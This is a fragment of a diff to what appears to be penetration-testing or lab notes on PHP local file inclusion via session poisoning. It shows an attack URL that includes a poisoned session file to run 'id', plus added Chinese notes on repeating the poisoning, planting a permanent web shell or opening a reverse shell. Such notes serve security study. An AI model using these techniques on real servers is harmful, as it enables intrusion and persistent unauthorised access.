@@ -95,6 +95,8 @@ Session poisoning:
   call session + id command:
     http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
 
+  注意：要执行另一条命令，需要再次用 web shell 对会话文件进行投毒，因为它在我们上次包含后会被 /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd 覆盖。
+  理想情况下，我们会使用被投毒的 web shell 向 web 目录写入一个永久的 web shell，或者发送一个反向 shell 以便于交互。
 
 Log poisoning:
   dir:
